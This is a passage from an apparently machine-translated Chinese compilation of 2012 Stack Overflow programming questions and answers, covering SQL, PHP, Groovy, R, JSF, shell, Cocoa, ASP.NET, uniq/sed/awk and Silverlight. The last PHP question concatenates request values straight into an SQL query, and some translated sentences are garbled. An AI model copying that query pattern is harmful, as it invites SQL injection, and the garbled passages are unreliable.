FULL OUTER JOIN votes_comments ON votes_comments.comment_id = comments.comment_id
AND votes_comments.user_id=1
WHERE track_id=6 AND parent_id=-1 
GROUP BY comments.comment_id 
```

**编辑**

对于那个很抱歉。您可以[在此处](http://www.xaprb.com/blog/2006/05/26/how-to-write-full-outer-join-in-mysql/)和[此处](https://stackoverflow.com/questions/2384298/mysql-full-outer-join-syntax-error)`FULL OUTER JOIN`总结有关它的更多信息

# php - 在 PHP 中编写高流量 API 可以吗？

> ID：10084062
> 
> 赞同：0
> 
> 时间：2012-04-10T06:24:01.773
> 
> 标签：php

我被分配了为高流量移动应用程序创建 API 的任务。用PHP可行吗？有什么特别的瓶颈需要我注意吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:25:39.033

php 相当快，但如果它是一个 API，那么可能会有一个数据库，对吧？您需要将重点放在查询上，因为这是最有可能出现瓶颈的地方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:33:30.240

我同意上面的答案，就速度而言，php 非常快，但是当您考虑大量流量时，如果您无法管理内存缓冲区并释放内存引用，您将面临问题。每次使用变量和对象后，您都必须释放内存。并优化查询。

也取决于打开内存线程。所以你必须选择Linux服务器，因为它支持mysql大约10000个线程。windows默认只支持150个

# groovy - Groovy 使用单引号

> ID：10084065
> 
> 赞同：0
> 
> 时间：2012-04-10T06:24:13.697
> 
> 标签：groovy

如果我必须定义下面列出的变量，我可以使用 ''' 来使我的工作正常

```
def MainTable = '''
         0S : MAKE-CALL
         0# : MAKE-CALL
         00 : MAKE-CALL
         (=Emergency) : EMERGENCY-CALL(sip: "911 =domain =dialPhone)
         (=N11) : MAKE-CALL(sip: #1v =domain =dialString)
         (=SpeedDial) : MAKE-CALL(sip: #1v =domain =dialString)
         (=PhoneNumber) : MAKE-CALL(sip: #1v =domain =dialPhone)
         (=ImmediateVSCs) : RETURN
         (=DelayedVSCs) : RETURN
         (x{1-20})S : MAKE-CALL(sip: #1 =domain =dialPhone)
         (x{1-20})# : MAKE-CALL(sip: #1 =domain =dialPhone)'''; 
```

如果我使用单引号这样定义相同的变量，则会引发错误

```
def MainTable = '
         0S : MAKE-CALL
         0# : MAKE-CALL
         00 : MAKE-CALL
         (=Emergency) : EMERGENCY-CALL(sip: "911 =domain =dialPhone)
         (=N11) : MAKE-CALL(sip: #1v =domain =dialString)
         (=SpeedDial) : MAKE-CALL(sip: #1v =domain =dialString)
         (=PhoneNumber) : MAKE-CALL(sip: #1v =domain =dialPhone)
         (=ImmediateVSCs) : RETURN
         (=DelayedVSCs) : RETURN
         (x{1-20})S : MAKE-CALL(sip: #1 =domain =dialPhone)
         (x{1-20})# : MAKE-CALL(sip: #1 =domain =dialPhone)';

1 compilation error:
unexpected char: ''' at line: 1, column: 17 
```

如何使用单引号使用 MainTable 变量，我不想将所有内容放在一行中

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T08:43:29.623

除了[sbglasius 的正确答案之外](https://stackoverflow.com/a/10084805/6509)[，`stripMargin()`](http://groovy.codehaus.org/groovy-jdk/java/lang/String.html#stripMargin())我非常喜欢[方法](http://groovy.codehaus.org/groovy-jdk/java/lang/String.html#stripMargin())，因为您不需要在 String 定义的开头转义一个空行：

```
def mainTable = '''0S : MAKE-CALL
                  |0# : MAKE-CALL
                  |00 : MAKE-CALL
                  |(=Emergency) : EMERGENCY-CALL(sip: "911 =domain =dialPhone)
                  |(=N11) : MAKE-CALL(sip: #1v =domain =dialString)
                  |(=SpeedDial) : MAKE-CALL(sip: #1v =domain =dialString)
                  |(=PhoneNumber) : MAKE-CALL(sip: #1v =domain =dialPhone)
                  |(=ImmediateVSCs) : RETURN
                  |(=DelayedVSCs) : RETURN
                  |(x{1-20})S : MAKE-CALL(sip: #1 =domain =dialPhone)
                  |(x{1-20})# : MAKE-CALL(sip: #1 =domain =dialPhone)'''.stripMargin() 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-10T07:29:24.147

你可以在 Java 中这样做：

```
def MainTable = '\
     0S : MAKE-CALL\
     0# : MAKE-CALL\
     00 : MAKE-CALL\
     (=Emergency) : EMERGENCY-CALL(sip: "911 =domain =dialPhone)\
     (=N11) : MAKE-CALL(sip: #1v =domain =dialString)\
     (=SpeedDial) : MAKE-CALL(sip: #1v =domain =dialString)\
     (=PhoneNumber) : MAKE-CALL(sip: #1v =domain =dialPhone)\
     (=ImmediateVSCs) : RETURN\
     (=DelayedVSCs) : RETURN\
     (x{1-20})S : MAKE-CALL(sip: #1 =domain =dialPhone)\
     (x{1-20})# : MAKE-CALL(sip: #1 =domain =dialPhone)'; 
```

但是我看不到不使用三重单引号的意义。如果要去除前置空格，只需将 .stripIndention() 添加到字符串表达式：

```
 def myMultilineString = '''
            Some text
            Some more text'''.stripIndent() 
```

# r - 如何重新编码while循环以优化R中大型模拟的性能？

> ID：10084066
> 
> 赞同：0
> 
> 时间：2012-04-10T06:24:21.837
> 
> 标签：r

我需要生成审查百分比不能为 0 或 1 的模拟数据。这就是我使用 while 循环的原因。问题是如果我将计数增加到 10,000（而不是 5），程序会非常慢。我必须用 400 种不同的场景重复这个，所以它非常慢。我试图找出可以将我的代码逐个矢量化的地方。我怎样才能避免while循环并且仍然能够保持条件？

另一种方法是保留 while 循环并生成符合我的条件的 10,000 个数据集的列表，然后将该函数应用于列表。这里我以汇总函数为例，但我的实际函数同时使用 X_after 和 delta（即 mle(X_after,delta)）。如果我必须使用 while 循环，这是一个更好的选择吗？

我担心的另一个问题是内存问题。在进行如此大的模拟时如何避免耗尽内存？

```
mu=1 ; sigma=3 ; n=10 ; p=0.10
dset <- function (mu,sigma, n, p) {              
   Mean <- array()
   Median <- array()
   Pct_cens_array <- array()
   count = 0
   while(count < 5) { 

     lod <- quantile(rlnorm(100000, log(mu), log(sigma)), p = p)
     X_before <- rlnorm(n, log(mu), log(sigma))
     X_after <-  ifelse(X_before <= lod, lod,  X_before)
     delta <- ifelse(X_before <= lod, 1,  0) 
     pct_cens <- sum(delta)/length(delta)
     # print(pct_cens)
     if (pct_cens == 0 | pct_cens == 1 ) next
     else {
        count <-  count +1
        if (pct_cens > 0 & pct_cens < 1) {
             sumStats <- summary(X_after)
             Median[count] <- sumStats[3]
             Mean [count]<- sumStats[4]
             Pct_cens_array [count] <- pct_cens 
             print(list(pct_cens=pct_cens,X_after=X_after, delta=delta, Median=Median,Mean=Mean,Pct_cens_array=Pct_cens_array))
          }
       }
    }

          return(data.frame(Pct_cens_array=Pct_cens_array, Mean=Mean, Median=Median)) 
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:34:07.590

我从 C 编程中学到的第一条规则：分而治之！我的意思是你应该首先创建多个函数并将它们调用到你的循环中，因为这个循环做了太多不同的事情。我担心你的算法：

```
if (pct_cens == 0 | pct_cens == 1 ) next
            else {count <-  count +1 
```

你有什么理由使用while而不是for？while 和 for 循环之间有区别：使用 while，你总是有第一个循环，而不是 for。

最后，关于您的问题：使用更多内存和数组来提高速度。例子：

```
lod <- quantile(rlnorm(100000, log(mu), log(sigma)), p = p)
            X_before <- rlnorm(n, log(mu), log(sigma)) 
```

log(mu) 和 log(sigma) 计算两次：使用变量来存储结果，您会节省时间，但当然会花费更多内存。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T09:50:03.637

我对您的代码做了一些小调整，但没有改变它的整体风格。听从 Yoong Kim 的建议并尝试将代码分解成更小的部分，以使其更具可读性和可维护性会很好。

*   您的函数现在有两个“n”参数，用于表示每行中有多少个样本，以及您想要多少次迭代（列）。

*   您正在增长数组`Median`并`Mean`在循环中，这需要大量重新分配内存和复制内容，这会减慢一切。我已经预定义`X_after`并在循环之后移动了平均值和中值计算以避免这种情况。（作为奖励，`mean`只`median`被调用一次而不是`n_iteration`多次。）

*   `ifelse`真的不需要打电话。

*   调用`rlnorm`一次，为 x 和 lod 生成足够的值，比调用两次要快一些。

这是更新的功能。

```
dset2 <- function (mu, sigma, n_samples, n_iterations, p) {    
  X_after <- matrix(NA_real_, nrow = n_iterations, ncol = n_samples)
  pct_cens <- numeric(n_iterations)
  count <- 1
  while(count <= n_iterations) {     
    random_values <- rlnorm(2L * n_samples, log(mu), log(sigma))
    lod <- quantile(random_values[1:n_samples], p = p)
    X_before <- random_values[(n_samples + 1L):(2L * n_samples)]
    X_after[count, ] <- pmax(X_before, lod)
    delta <- X_before <= lod
    pct_cens[count] <- mean(delta)
    if (pct_cens > 0 && pct_cens < 1 ) count <- count + 1
  }

  Median <- apply(X_after, 1, median)
  Mean <- rowMeans(X_after)
  data.frame(Pct_cens_array=pct_cens, Mean=Mean, Median=Median) 
} 
```

比较时间，例如，

```
mu=1
sigma=3
n_samples=10L
n_iterations = 1000L
p=0.10
system.time(dset(mu,sigma, n_samples, n_iterations, p))
system.time(dset2(mu,sigma, n_samples, n_iterations, p)) 
```

在我的机器上，有 3 倍的加速。

# jsf - 区别requestScope和request.getParameter？

> ID：10084067
> 
> 赞同：0
> 
> 时间：2012-04-10T06:24:23.117
> 
> 标签：jsf

我想知道何时将以下代码放入我的 JSF 中。

```
<h:inputHidden id="patientId" value="#{requestScope['patientId']}"/>
<%=request.getParameter("patientId") %> 
```

我的流程就像 One.jsf --> 单击名为 backing Bean 的链接 --> 从 backing bean 导航到 Two.jsf

我在 One.jsf 的请求范围内设置了 patientID。我可以在支持 bean 上访问它。

现在在 two.jsf 上使用

```
<%=request.getParameter("patientId") %> 
```

我可以访问我的值 ID，但使用

```
<h:inputHidden id="patientId" value="#{requestScope['patientId']}"/> 
```

我无法访问我的 value-id。即使在 html 页面源代码中也没有显示我的价值....？？

为什么是这样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T12:35:45.730

从 Request 对象中，您可以获取请求参数（在 GET 请求中传递给 URL 的那些参数）和请求属性（请求属性是存储在请求对象中的值，并且在请求完成之前一直存在）。

```
#{requestScope['patientId]}' 
```

对应于 request.get/setAttribute(...)

```
#{param['patiendId']} 
```

对应request.getParameter()（参数是只读的，不能设置）。

在您的情况下，您可以访问托管 bean 中的值，因为它存储在调用托管 bean 的同一请求中。当请求完成并打开一个新页面时，您将无法再访问此值，因为它与上一个请求相关联。

# c# - 无效的选项文件选项：pad=oper

> ID：10084071
> 
> 赞同：0
> 
> 时间：2012-04-10T06:24:59.700
> 
> 标签：c#, .net, command-line, command-line-arguments, astyle

收到此错误：尝试通过 C# 调用 Astyle 时的选项文件选项无效

```
 System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
    pProcess.StartInfo.FileName = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\Astyle.exe";

    //strCommandParameters are parameters to pass to program
    //pProcess.StartInfo.Arguments = "--style=ansi --recursive  "+System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location)+"/*.cpp";

    pProcess.StartInfo.Arguments = " options=none test.cpp";
    //pProcess.StartInfo.Arguments = " -h";
    pProcess.StartInfo.UseShellExecute = false;

    //Set output of program to be written to process output stream
    pProcess.StartInfo.RedirectStandardOutput = true;
    pProcess.StartInfo.RedirectStandardError = true;
    //Optional
    pProcess.StartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);

    //Start the process
    pProcess.Start();

    //Get program output
    string strOutput = pProcess.StandardOutput.ReadToEnd();
    string strError = pProcess.StandardError.ReadToEnd();
    //Wait for process to finish
    pProcess.WaitForExit(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:31:07.207

如果您查看[此链接](http://astyle.sourceforge.net/astyle.html#_Options)，正确的语法似乎是

```
--options=none 
```

# java - 无法执行shell脚本

> ID：10084075
> 
> 赞同：-2
> 
> 时间：2012-04-10T06:25:52.193
> 
> 标签：java, linux

```
#!/bin/bash
#echo off
echo -n Enter acl File Location
read acl
echo -n Enter target sql File Location
read sql
cd bin
pwd
java -cp .:../lib/dom4j-1.6.1.jar:../lib/poi-3.8-20120326.jar:../lib/poi-ooxml-3.8-20120326.jar:../lib/poi-ooxml-schemas-3.8-20120326.jar:../lib/stax-api-1.0.1.jar:
.:../lib/xmlbeans-2.3.0.jar com/paywithisis/gateway/utility/XLSXToSQLConverter $acl $sql
cd ..
echo $acl
echo $sql 
```

错误信息：

```
../lib/xmlbeans-2.3.0.jar: line 1: PK: command not found
../lib/xmlbeans-2.3.0.jar: line 2: Lk¶6: command not found
../lib/xmlbeans-2.3.0.jar: line 3:Kk¶6KAKÛnMETA-INF/MANIFEST.MF}AkÂ@…ï
                                                                           ûæØv“h!7-„Úƒ¶â­¬ÉXÙÙ°: No such file or directory
../lib/xmlbeans-2.3.0.jar: line 3: ¶úï›5: command not found
../lib/xmlbeans-2.3.0.jar: line 4: B¯óÞ: command not found
../lib/xmlbeans-2.3.0.jar: line 4: óÞ¬
                                      5
                                       ¬¶èCã¨„‰N¥˜ÓŸÉ¼3Õ¡ŸõâLO¥xöhkµ¸¡³ÏI¦öi›Áª©¼
                                                                                    —Àh,©ÒRHñf,–àüWb®¼älÛ=: command not found
../lib/xmlbeans-2.3.0.jar: line 5: IÏsÖñxjgÛE”à{È™Îuªü´HŸòBŠ¥íZŒU½7Ül=°õ}gKýOÜÕÎy6îÀ?Æ#¼¸ÕWËÝÊÇúµ„#sW: command not found
../lib/xmlbeans-2.3.0.jar: line 5: cµ[œØ:þàPK: command not found
../lib/xmlbeans-2.3.0.jar: line 6: 9k¶6org/PK: No such file or directory
../lib/xmlbeans-2.3.0.jar: line 7: 9k¶6
                                       org/apache/PK: No such file or directory
../lib/xmlbeans-2.3.0.jar: line 8: :k¶6org/apache/xmlbeans/PK: No such file or directory
../lib/xmlbeans-2.3.0.jar: line 9: syntax error near unexpected token `)'
../lib/xmlbeans-2.3.0.jar: line 9: 9k¶6«f)¸}¿'org/apache/xmlbeans/BindingConfig.class•T]OA=Ó.jµˆÈ7*‚Ð²úBŒ I%Å`j©mC$>é2-
                                                                                                                              Ë,n·¦?KäÁÄ€?ÊxgwÅÒ.´¼ÌÝ½wÏ¹çž¹íï??~x=ŽRƒèGZK1,Ç°ÃÓV&²ï
        å½ýí|9[ÜÊlf÷³Ëû™b1³Çþ”³šÎO¹q(ôæ‰U\Öõmé 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T06:34:00.730

问题似乎与以下命令有关，该命令分为两部分：

```
java -cp .:../lib/dom4j-1.6.1.jar:../lib/poi-3.8-20120326.jar:../lib/poi-ooxml-3.8-20120326.jar:../lib/poi-ooxml-schemas-3.8-20120326.jar:../lib/stax-api-1.0.1.jar:
.:../lib/xmlbeans-2.3.0.jar com/paywithisis/gateway/utility/XLSXToSQLConverter $acl $sql 
```

您需要在`.:../lib/xmlbeans-2.3.0.jar`

否则，shell 会尝试`../lib/xmlbeans-2.3.0.jar`直接执行，从而导致您看到的错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-10T06:30:18.353

看起来它正在尝试将JAR 文件作为脚本*运行。*`PK`和`MANIFEST`字符串是在压缩的 JAR 文件中找到的字符串。

你可能想检查你的类路径中没有错误的空格（或其他有趣的字符）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-10-29T21:39:46.857

当我将 java 命令从 bat 文件复制到 sh 文件时，同样的问题发生在我身上。在 Windows 中，类路径分隔符是 ';' 而在linux中，分隔符是'：'

# objective-c - 创建一个 Cocoa 框架并从另一个 Cocoa 项目中使用它

> ID：10084082
> 
> 赞同：1
> 
> 时间：2012-04-10T06:26:32.307
> 
> 标签：objective-c, cocoa, frameworks, settings

好的，我知道这个问题似乎很容易回答，或者可能记录在案，但老实说，我对这个主题 100% 感到困惑，效果就像......愚蠢的提交申请以供 Apple 审查，然后意识到（通过日志他们把我送回去了），框架不在那里（实际上，它是......但我的 Cocoa 应用程序正在其他地方寻找它）。

好的，所以...假设我有一个框架，其中包含我主要使用的 100 个不同的类（我确实有），如果我想将**我的框架与我的应用程序“捆绑”**（并将其复制到应用程序包的框架文件夹）？

*   构建设置-> 安装目录？（框架）
*   构建设置 - >标题搜索路径？（应用程序的）
*   构建设置-> 库搜索路径？（应用程序的）
*   构建设置-> 框架搜索路径？（应用程序的）
*   使用@rpath？如何？
*   还要别的吗？

鉴于我主要在**将框架“链接”到我的应用程序**时遇到问题（框架编译得很好，但是当使用它的应用程序尝试运行时偶尔可能会出现**运行时错误**（我......偶尔设法解决 - 但实际上没有知道如何...大声笑）），**你有什么建议？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:11:00.053

第三方框架应包含在应用程序包的 Frameworks 目录中。

添加一个新的副本文件构建阶段并指定框架目录，然后将您的框架添加到此目录：

[![](../Images/65f2d9a832e975e7516f3a643bd121c8.png)](https://i.stack.imgur.com/2d79a.png)

您可能还需要通过添加`Framework Search Path`like来告诉 Xcode 框架在哪里`"$(SRCROOT)/MyFrameworks"`。

# c# - ASP.NET - 在构建期间将项目添加到下拉列表

> ID：10084083
> 
> 赞同：2
> 
> 时间：2012-04-10T06:26:51.803
> 
> 标签：c#, asp.net, constructor

我有一个`user control`包含三个的网络`dropdownlists`：一个包含天，第二个包含月，第三个包含年。日期和月份是静态的。但是年份项目会根据需要更改，以避免输入错误的年份。让我先在这里列出我按顺序做的事情，然后我会问我的问题：

1.  我有一个私人 int yearSpan。
2.  在私有方法 PopulateYearList 我说：

    ```
    int year = DateTime.Now.Year;
    int span = year - this.yearSpan;
    for (int i = span; i <= year; i++)
    {
        ddlYears.Items.Add(i.ToString());//Here I get NullReferenceException
    } 
    ```

3.  我已经覆盖了默认构造函数以`yearSpan`作为参数接收：

    ```
     public DatePicker(int yearSpan)
     {
        this.yearSpan = yearSpan;
        this.PopulateYearList();
     } 
    ```

现在，正如您可能在我的方法中猜到的那样，`PopulateYearList`我得到`NullReferenceException`了因为我尝试添加一个`ddlYears`尚未构建的项目。你会建议做什么来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:31:18.477

不要在构造函数中调用 this.PopulateYearList，而是在用户控件的 Load 事件中调用它。

此外，我更喜欢您不使用用户控件的构造函数，而是使用公共属性，因为它可以保持其状态。

例如在页面中：

```
protected void Page_Load(object sender, EventArgs e)
{
   UserControl1.TimeSpan = DateTime.Now.Year;
} 
```

在用户控件中：

```
protected void Page_PreRender(object sender, EventArgs e)
{
    if(this.IsPostBack) 
    {
      PopulateYearList() 
    }
} 
```

只要您不从父页面对该控件进行任何更改，您的控件加载后的任何事件，您都可以调用 this.PopulateYearList。我在 PreRender 事件中调用它，就好像有人从页面更改了值，它最终会被用户控制值覆盖，因此我确信我的值没有被调和。

如果我遗漏了什么，请告诉我。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:38:58.327

以太调用你`PopulateYearList`的. 像这样：`Page_Load``usercontrol`

```
protected void Page_Load(object objSrc, EventArgs e)
{
    if(this.IsPostBack)
      PopulateYearList()
} 
```

或者在绑定控件时`PopulateYearList` `public`调用它`page``page`

# asp.net-mvc - 使用没有注释的 ASP MVC

> ID：10084089
> 
> 赞同：3
> 
> 时间：2012-04-10T06:27:10.810
> 
> 标签：asp.net-mvc

我只是在学习如何做 ASP MVC。我看到的所有教程都使用 Html.LabelFor 和 DisplayAttribute 的组合。就个人而言，我不太喜欢将这些类型的注释添加到我的模型对象中，我想知道是否有可接受的替代方案。我认为这可能是像 Knockout 或 Backbone 这样的地方，但我对这些东西太陌生了，以至于我很难将我的大脑包裹在不同的部分上。

我知道这可能已经被问到并得到了回答；我什至不知道如何谷歌它:(

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:52:58.330

您可以跳过数据注释

你可以写

```
<label for='@(var1)'>@Name</label> 
```

或者

```
<label for='name1'>Text</label> 
```

或者

```
Html.Label("ControlName", "Name") 
```

或者

```
Html.LabelFor  with data anot. 
```

这些都是正确的

还使用带有 lamda 表达式的助手（Html.LabelFor）比 Html.Label 或简单的 html 代码慢得多`<label for='@(var1)'>@Name</label>`

所有 asp.net mvc html 助手都是如此

# linux - 使用“uniq -c”命令时需要从输出中删除计数

> ID：10084090
> 
> 赞同：6
> 
> 时间：2012-04-10T06:27:13.260
> 
> 标签：linux, bash, shell, unix

我正在尝试读取文件并按特定字段的出现次数对其进行排序。假设我想从日志文件中找出重复次数最多的日期，然后我使用 uniq -c 选项并按降序对其进行排序。像这样的东西

```
uniq -c | sort -nr 
```

这将产生一些像这样的输出 -

```
809 23/Dec/2008:19:20 
```

实际上是计数的第一个字段对我来说是个问题....我想从上面的输出中得到一个日期，但我无法得到这个。我尝试使用 cut 命令并做到了

```
uniq -c | sort -nr | cut -d' ' -f2 
```

但这只是打印空白......请有人可以帮我只获取日期并砍掉计数。我只想

```
23/Dec/2008:19:20 
```

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-10T06:33:34.250

除非计数超过 7 位，否则计数`uniq`前面有空格，因此您需要执行以下操作：

```
uniq -c | sort -nr | cut -c 9- 
```

向上获取列（字符位置）9。或者您可以使用`sed`：

```
uniq -c | sort -nr | sed 's/^.\{8\}//' 
```

或者：

```
uniq -c | sort -nr | sed 's/^ *[0-9]* //' 
```

面对 10,000,000 或更多的重复计数，第二个选项是稳健的；如果您认为这可能是一个问题，它可能比`cut`替代方案更好。毫无疑问，还有其他选择。

* * *

警告：计数是通过在 Mac OS X 10.7.3 上进行的实验确定的，但使用`uniq`8.3`coreutils`中的 GNU。BSD`uniq -c`在一位数之前产生了 3 个前导空格。POSIX 规范说输出的[`uniq -c`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/uniq.html)格式应如下所示：

```
printf("%d %s", repeat_count, line); 
```

不会有任何前导空格。鉴于输出格式的这种可能差异，`sed`带有正则表达式的脚本`[0-9]`是处理观察到的和理论输出的可变性的最可靠方法`uniq -c`：

```
uniq -c | sort -nr | sed 's/^ *[0-9]* //' 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-10T06:36:27.887

而不是`cut -d' ' -f2`，尝试

```
awk '{$1="";print}' 
```

也许您需要在开始时再删除一个空白：

```
awk '{$1="";print}' | sed 's/^.//' 
```

或完全使用 sed，保留原始空白：

```
sed -r 's/^[^0-9]*[0-9]+//' 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-07-08T10:25:57.000

以下`awk`可能会对您有所帮助。

```
awk '{a[$0]++} END{for(i in a){print a[i],i | "sort -k2"}}'  Input_file 
```

***解决方案 2：***如果您希望输出顺序与输入相同，但不与排序相同。

```
awk '!a[$0]++{b[++count]=$0} {c[$0]++} END{for(i=1;i<=count;i++){print c[b[i]],b[i]}}'  Input_file 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-10T22:03:46.423

另一种解决方案是：

```
uniq -c | sort -nr | awk '{print $1, $2}' 
```

您也可以轻松打印单个字段。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-07-08T10:24:56.540

使用（因为您在问题中使用 -f2 ）

```
cat file |sort |uniq -c | awk '{ print $2; }' 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-11-03T12:21:39.340

如果您想在下游使用 count 字段，以下命令会将其重新格式化为“管道友好”制表符分隔格式，没有左侧填充：

```
 .. | sort | uniq -c | sed -r 's/^ +([0-9]+) /\1\t/' 
```

对于原始任务，这有​​点过头了，但是在重新格式化后，`cut`可以按照 OP 的意图来删除该字段：

```
 .. | sort | uniq -c | sed -r 's/^ +([0-9]+) /\1\t/' | cut -d $'\t' -f2- 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-01-13T16:46:34.367

添加`tr -s`到管道链以将多个空格“挤压”到一个空格分隔符中：

```
uniq -c | tr -s ' ' | cut -d ' ' -f3 
```

`tr`在一些不起眼的地方非常有用。不幸的是，它并没有摆脱第一个前导空格，因此`-f3`

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-07-08T10:25:16.533

您可以使用`sed`去掉前导空格和打印的数字`uniq -c`

```
sort file | uniq -c | sed 's/^ *[0-9]* //' 
```

我会用一个例子来说明这一点。考虑一个文件

```
winebottles.mkv
winebottles.mov
winebottles.xges
winebottles.xges~
winebottles.mkv
winebottles.mov
winebottles.xges
winebottles.xges~ 
```

命令

```
sort file | uniq -c | sed 's/^ *[0-9]* //' 
```

会回来

```
winebottles.mkv
winebottles.mov
winebottles.xges
winebottles.xges~ 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-07-08T10:32:25.023

**第一个解决方案**
仅`sort`在未考虑输入重复时使用。`sort`有独特的选择`-u`

*   `sort -u file`
*   `sort -u < file`

前任。：

```
$ cat > file
a
b
c
a
a
g
d
d
$ sort -u file
a
b
c
d
g 
```

 **如果`sort`基于重复的ing很重要，则**第二种解决方案****

 ***   `sort txt | uniq -c | sort -k1 -nr | sed 's/^ \+[0-9]\+ //g'`
*   `sort txt | uniq -c | sort -k1 -nr | perl -lpe 's/^ +[\d]+ +//g'`

有这个输出：

```
a
d
g
c
b 
```**

# c# - ApplicationBar 是一种类型，但在全景视图中用作变量

> ID：10084100
> 
> 赞同：0
> 
> 时间：2012-04-10T06:28:12.620
> 
> 标签：c#, silverlight, windows-phone-7

我正在尝试在全景视图的代码中创建一个本地化的应用程序栏。这是我的代码：

```
// Helper function to build a localized ApplicationBar
        private void BuildApplicationBar()
        {
            // Set the page's ApplicationBar to a new instance of ApplicationBar.
            ApplicationBar = new ApplicationBar();

            ApplicationBar.Mode = ApplicationBarMode.Minimized;

            // Create a new button and set the text value to the localized string from AppResources.
            ApplicationBarIconButton homeButton = new ApplicationBarIconButton(new Uri("/Images/icons_home.png", UriKind.Relative));
            homeButton.Text = AppResources.HomeIcon;
            ApplicationBar.Buttons.Add(homeButton);
            homeButton.Click += new EventHandler(HomeButton_Click);

            ApplicationBarIconButton searchButton = new ApplicationBarIconButton(new Uri("/Images/appbar.feature.search.rest.png", UriKind.Relative));
            searchButton.Text = AppResources.SearchIcon;
            ApplicationBar.Buttons.Add(searchButton);
            searchButton.Click += new EventHandler(SearchButton_Click);
        } 
```

但是，它不会将我的 ApplicationBar 识别为属性。错误说：“Microsoft.Phone.Shell.ApplicationBar”是一种“类型”，但用作“变量”。知道为什么吗？非常感谢！

飞

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T06:35:14.097

你的礼节与它所拥有的类型同名。重命名它。所以：

```
ApplicationBar ApplicationBar
{
  get;
  set;
} 
```

至

```
ApplicationBar MyApplicationBar
{
  get;
  set;
} 
```

和

```
ApplicationBar = new ApplicationBar(); 
```

至

```
this.MyApplicationBar = new ApplicationBar(); 
```

以及任何其他提及的适当性`this.MyApplicationBar`

# c# - Safari Mac OSX 退格问题

> ID：10084101
> 
> 赞同：2
> 
> 时间：2012-04-10T06:28:24.217
> 
> 标签：c#, javascript, html, silverlight, safari

有没有人知道如何处理 Safari Web 浏览器的行为，即每当用户按下退格键时将当前页面设置为上一页？每当我们的用户尝试使用退格/删除键更正字段时，我目前在 Mac OSX Lion 10.7.2 和 silverlight 应用程序上遇到此问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T11:20:16.907

我过去也遇到过这个问题。我花了大约一周的时间试图想出一个解决方案，最终解决这个问题的最佳方法（可以说我从未找到“修复”）如下：

1.  使用 Javascript 暂停所有退格键按下事件。不允许任何退格事件到达 Silverlight 容器。这将意味着 Silverlight 不再将您带到上一页，但您也无法删除文本字段中的任何文本！第 2 点解释了如何解决这个问题。

2.  将`KeyUp`事件处理程序附加到`RootVisual`您的 Silverlight 控件。`KeyEventArgs`' 原始来源是一个 TextField 而键本身是`Key.Back`，那么我们必须手动删除文本框内的一些文本。我们通过查看 TextBox 的`SelectionStart`和`SelectionLength`属性来做到这一点。`SelectionStart`为您提供要删除的位置，并`SelectionLength`为您提供要删除的字符数。最后，您需要计算出光标现在应该在哪里的正确位置。这应该等于`SelectionStart`属性的值。

这种方法有一个缺陷。因为我们必须手动监听`KeyUp`事件，所以`Key.Back` `KeyUp`只有在退格键被释放时才会触发事件。这意味着如果您使用 Safari 并按住退格键，则只会删除一个字符。您将需要释放退格键并再次按下它以删除另一个字符。在我看来，这是一个很小的代价，考虑到替代方案是查看前一页或根本不处理退格！

值得注意的是，所有这些都可以是 Mac/Safari 特定的。您可以使用来查找浏览器类型，并且仅在浏览器是 Safari 时`HtmlPage.BrowserInformation.UserAgent`附加处理程序。`RootVisual_KeyUp`如果您也只在 Safari 中暂停 javascript 中的退格事件，这只会在 Mac/Safari 中产生影响，并为所有其他浏览器保留默认功能。

祝你好运！希望这可以帮助！

# php - 将 mysql 与 php 和 ajax 一起使用，我想为此查询打印一个字符串（而不是 0/1）

> ID：10084102
> 
> 赞同：1
> 
> 时间：2012-04-10T06:28:29.237
> 
> 标签：php, mysql

如果这个问题以前出现过，我深表歉意，但我已经看过并且只发现了只关心返回的实际结果的人

```
mysql_query($query); 
```

我正在为一个项目制作一个带有 ajax 的 php/mysql 页面，用户可以在该项目中创建一个数据库并通过与几个选择框交互来执行搜索。我还希望能够打印出 php 生成的实际查询，仅用于测试。

```
if($dArray[0] == 'sb2a'){
$sql = "SELECT * FROM Vehicles WHERE " . $dArray[1] . " = \'" . $dArray[2] + "\'";}
print($sql); 
```

它只是打印 0 而不是类似的东西

> “从 VID = '01' 的车辆中选择 *”

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:30:07.160

在代码行的末尾附近设置值`$sql`：

```
. $dArray[2] + "\'"; 
```

那`+`应该是一个`.`

* * *

## 回答 #2

> 赞同：1
> 
